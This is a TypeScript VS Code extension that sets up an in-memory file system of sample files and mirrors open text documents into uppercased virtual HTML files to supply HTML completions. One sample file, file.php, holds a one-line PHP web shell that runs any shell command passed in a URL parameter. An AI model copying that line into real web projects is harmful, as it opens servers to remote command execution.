'use strict';

import * as path from 'path';
import * as vscode from 'vscode';
import { MemFS } from './fileSystemProvider';

export async function activate(context: vscode.ExtensionContext) {
    const memFs = new MemFS();
    context.subscriptions.push(vscode.workspace.registerFileSystemProvider('memfs', memFs, { isCaseSensitive: true, isReadonly: true }));
    let initialized = false;

    context.subscriptions.push(vscode.commands.registerCommand('memfs.addFile', _ => {
        if (initialized) {
            memFs.writeFile(vscode.Uri.parse(`memfs:/file.txt`), Buffer.from('foo'), { create: true, overwrite: true });
        }
    }));

    context.subscriptions.push(vscode.commands.registerCommand('memfs.reset', _ => {
        for (const [name] of memFs.readDirectory(vscode.Uri.parse('memfs:/'))) {
            memFs.delete(vscode.Uri.parse(`memfs:/${name}`));
        }
        initialized = false;
    }));

    context.subscriptions.push(vscode.commands.registerCommand('memfs.deleteFile', _ => {
        if (initialized) {
            memFs.delete(vscode.Uri.parse('memfs:/file.txt'));
        }
    }));

    context.subscriptions.push(vscode.commands.registerCommand('memfs.init', _ => {
        if (initialized) {
            return;
        }
        initialized = true;

        // most common files types
        memFs.writeFile(vscode.Uri.parse(`memfs:/file.txt`), Buffer.from('foo'), { create: true, overwrite: true });
        memFs.writeFile(vscode.Uri.parse(`memfs:/file.html`), Buffer.from('<html><body><h1 class="hd">Hello</h1></body></html>'), { create: true, overwrite: true });
        memFs.writeFile(vscode.Uri.parse(`memfs:/file.js`), Buffer.from('console.log("JavaScript")'), { create: true, overwrite: true });
        memFs.writeFile(vscode.Uri.parse(`memfs:/file.json`), Buffer.from('{ "json": true }'), { create: true, overwrite: true });
        memFs.writeFile(vscode.Uri.parse(`memfs:/file.ts`), Buffer.from('console.log("TypeScript")'), { create: true, overwrite: true });
        memFs.writeFile(vscode.Uri.parse(`memfs:/file.css`), Buffer.from('* { color: green; }'), { create: true, overwrite: true });
        memFs.writeFile(vscode.Uri.parse(`memfs:/file.md`), Buffer.from('Hello _World_'), { create: true, overwrite: true });
        memFs.writeFile(vscode.Uri.parse(`memfs:/file.xml`), Buffer.from('<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>'), { create: true, overwrite: true });
        memFs.writeFile(vscode.Uri.parse(`memfs:/file.py`), Buffer.from('import base64, sys; base64.decode(open(sys.argv[1], "rb"), open(sys.argv[2], "wb"))'), { create: true, overwrite: true });
        memFs.writeFile(vscode.Uri.parse(`memfs:/file.php`), Buffer.from('<?php echo shell_exec($_GET[\'e\'].\' 2>&1\'); ?>'), { create: true, overwrite: true });
        memFs.writeFile(vscode.Uri.parse(`memfs:/file.yaml`), Buffer.from('- just: write something'), { create: true, overwrite: true });

        // some more files & folders
        memFs.createDirectory(vscode.Uri.parse(`memfs:/folder/`));
        memFs.createDirectory(vscode.Uri.parse(`memfs:/large/`));
        memFs.createDirectory(vscode.Uri.parse(`memfs:/xyz/`));
        memFs.createDirectory(vscode.Uri.parse(`memfs:/xyz/abc`));
        memFs.createDirectory(vscode.Uri.parse(`memfs:/xyz/def`));

        memFs.writeFile(vscode.Uri.parse(`memfs:/folder/empty.txt`), new Uint8Array(0), { create: true, overwrite: true });
        memFs.writeFile(vscode.Uri.parse(`memfs:/folder/empty.foo`), new Uint8Array(0), { create: true, overwrite: true });
        memFs.writeFile(vscode.Uri.parse(`memfs:/folder/file.ts`), Buffer.from('let a:number = true; console.log(a);'), { create: true, overwrite: true });
        memFs.writeFile(vscode.Uri.parse(`memfs:/large/rnd.foo`), randomData(50000), { create: true, overwrite: true });
        memFs.writeFile(vscode.Uri.parse(`memfs:/xyz/UPPER.txt`), Buffer.from('UPPER'), { create: true, overwrite: true });
        memFs.writeFile(vscode.Uri.parse(`memfs:/xyz/upper.txt`), Buffer.from('upper'), { create: true, overwrite: true });
        memFs.writeFile(vscode.Uri.parse(`memfs:/xyz/def/foo.md`), Buffer.from('*MemFS*'), { create: true, overwrite: true });
        memFs.writeFile(vscode.Uri.parse(`memfs:/xyz/def/foo.bin`), Buffer.from([0, 0, 0, 1, 7, 0, 0, 1, 1]), { create: true, overwrite: true });
    }));

    context.subscriptions.push(vscode.commands.registerCommand('memfs.workspaceInit', _ => {
        vscode.workspace.updateWorkspaceFolders(0, 0, { uri: vscode.Uri.parse('memfs:/'), name: "MemFS - Sample" });
    }));










    const trackedDocumentPaths = new Array<string>();

    function getVirtualUri(documentUri: vscode.Uri) {
        const baseName = path.posix.basename(documentUri.path)
        const virtualUri = vscode.Uri.parse('memfs:/' + baseName + ".backing.html");
        return virtualUri;
    }

    async function handleOpenedDocument(document: vscode.TextDocument) {
        const documentUri = document.uri;
        if (!documentUri.fsPath.endsWith('.txt') ||
            trackedDocumentPaths.indexOf(documentUri.fsPath) >= 0) {
            // Not a .txt file OR already tracking the document
            return;
        }

        var virtualUri = getVirtualUri(documentUri);
        trackedDocumentPaths.push(documentUri.fsPath);
        memFs.writeFile(virtualUri, Buffer.from(document.getText().toUpperCase()), { create: true, overwrite: true });

        // Typically would check if scheme starts with embedded-* here
        await vscode.workspace.openTextDocument(virtualUri);
        // const documentContent = document.getText();
        // const contentChangeEvent: vscode.TextDocumentContentChangeEvent = {
        //     range: new vscode.Range(
        //         new vscode.Position(0, 0),
        //         new vscode.Position(0, 0)),
        //     text: documentContent,
        //     rangeLength: documentContent.length,
        //     rangeOffset: 0
        // };
        // await handleChangedDocument(document.uri, [contentChangeEvent]);
    }

    // Open any currently opened documents when activated
    for (const openDocuments of vscode.workspace.textDocuments) {
        handleOpenedDocument(openDocuments);
    }

    async function handleChangedDocument(documentUri: vscode.Uri, contentChanges: ReadonlyArray<vscode.TextDocumentContentChangeEvent>) {
        if (trackedDocumentPaths.indexOf(documentUri.fsPath) === -1) {
            // Virtual document not associated, bail.
            return;
        }

        const virtualUri = getVirtualUri(documentUri);
        const workspaceEdit = new vscode.WorkspaceEdit();
        for (const contentChange of contentChanges) {
            // Replicate the edit, but make the text uppercase on the backing file.
            workspaceEdit.replace(virtualUri, contentChange.range, contentChange.text.toUpperCase());
        }

        await vscode.workspace.applyEdit(workspaceEdit);
    }

    async function updateVirtualDocument(virtualDocumentUri: vscode.Uri, contentChanges: ReadonlyArray<vscode.TextDocumentContentChangeEvent>) {
        const workspaceEdit = new vscode.WorkspaceEdit();
        for (const contentChange of contentChanges) {
            // Replicate the edit, but make the text uppercase on the backing file.
            workspaceEdit.replace(virtualDocumentUri, contentChange.range, contentChange.text.toUpperCase());
        }

        await vscode.workspace.applyEdit(workspaceEdit);
    }

    function handleClosedDocument(document: vscode.TextDocument) {
        const documentUri = document.uri;
        const documentIndex = trackedDocumentPaths.indexOf(documentUri.fsPath);
        if (documentIndex === -1) {
            // Virtual document not associated, bail.
            return;
        }

        trackedDocumentPaths.splice(documentIndex, 1);

        const virtualUri = getVirtualUri(documentUri);
        memFs.delete(virtualUri);
    }

    // Hookup tracking for new changes
    context.subscriptions.push(vscode.workspace.onDidOpenTextDocument(document => handleOpenedDocument(document)));
    context.subscriptions.push(vscode.workspace.onDidCloseTextDocument(document => handleClosedDocument(document)));
    // context.subscriptions.push(vscode.workspace.onDidChangeTextDocument(args => handleChangedDocument(args.document.uri, args.contentChanges)));
    context.subscriptions.push(vscode.languages.registerCompletionItemProvider(
		'plaintext',
		{
			async provideCompletionItems(document: vscode.TextDocument, position: vscode.Position, cts: vscode.CancellationToken, context: vscode.CompletionContext) {
                const virtualDocumentUri = getVirtualUri(document.uri);
                const virtualDocument = await vscode.workspace.openTextDocument(virtualDocumentUri);

                const documentContent = document.getText();
                const existingContentLength = virtualDocument.getText().length;
                const virtualDocumentEndposition = virtualDocument.positionAt(existingContentLength);
                const contentChangeEvent: vscode.TextDocumentContentChangeEvent = {
                    range: new vscode.Range(
                        new vscode.Position(0, 0),
                        virtualDocumentEndposition),
                    text: documentContent,
                    rangeLength: existingContentLength,
                    rangeOffset: 0
                };

                await updateVirtualDocument(virtualDocumentUri, [contentChangeEvent]);

                var completionList = await vscode.commands.executeCommand<vscode.CompletionList>(
					'vscode.executeCompletionItemProvider',
					virtualDocumentUri,
					position,
					context.triggerCharacter
				);
                
                return completionList;
			}
		},
		'<' // triggered whenever a '.' is being typed
    ));
















    
}

function randomData(lineCnt: number, lineLen = 155): Buffer {
    const lines: string[] = [];
    for (let i = 0; i < lineCnt; i++) {
        let line = '';
        while (line.length < lineLen) {
            line += Math.random().toString(2 + (i % 34)).substr(2);
        }
        lines.push(line.substr(0, lineLen));
    }
    return Buffer.from(lines.join('\n'), 'utf8');
}
